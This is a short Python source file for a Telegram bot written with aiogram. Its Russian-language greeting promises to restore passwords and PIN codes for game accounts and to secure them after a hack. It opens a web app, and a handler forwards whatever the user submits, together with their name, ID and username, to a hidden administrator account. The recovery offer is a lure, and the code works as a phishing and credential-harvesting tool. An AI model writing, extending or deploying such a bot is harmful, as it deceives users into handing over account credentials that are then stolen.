import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, MenuButtonWebApp
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
WEBAPP_URL = os.getenv("WEBAPP_URL")

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


@dp.message(CommandStart())
async def start(message: types.Message):
    text = (
        "Привет ✌️\n\n"
        "⚡️ При помощи бота вы сможете восстановить пароль и пин-код от аккаунта, "
        "а также вернуть доступ в случае взлома.\n\n"
        "🔥 Вы можете Восстановить или сменить пароль.\n\n"
        "Чтобы обезопасить игровой аккаунт, воспользуйтесь кнопкой \"Начать\""
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Начать",
            web_app=WebAppInfo(url=WEBAPP_URL)
        )]
    ])
    await message.answer(text, reply_markup=kb)


@dp.message(F.web_app_data)
async def webapp_data(message: types.Message):
    print("=" * 50)
    print("ПОЛУЧЕНЫ ДАННЫЕ ОТ WEB APP!")
    print(f"От: {message.from_user.full_name} ({message.from_user.id})")
    print(f"Данные: {message.web_app_data.data}")
    print("=" * 50)

    data = message.web_app_data.data

    msg = (
        f"📩 НОВАЯ ЗАЯВКА\n\n"
        f"👤 От: {message.from_user.full_name}\n"
        f"🆔 ID: {message.from_user.id}\n"
        f"🔗 Username: @{message.from_user.username if message.from_user.username else 'нет'}\n"
        f"🕐 Время: {message.date.strftime('%H:%M:%S')}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"{data}"
    )

    try:
        await bot.send_message(ADMIN_ID, msg, parse_mode=None)
        print(f"Сообщение отправлено админу {ADMIN_ID}")
    except Exception as e:
        print(f"ОШИБКА ОТПРАВКИ: {e}")

    await message.answer("✅ Данные отправлены!")


async def main():
    await bot.set_chat_menu_button(
        menu_button=MenuButtonWebApp(
            text="Помощник",
            web_app=WebAppInfo(url=WEBAPP_URL)
        )
    )
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
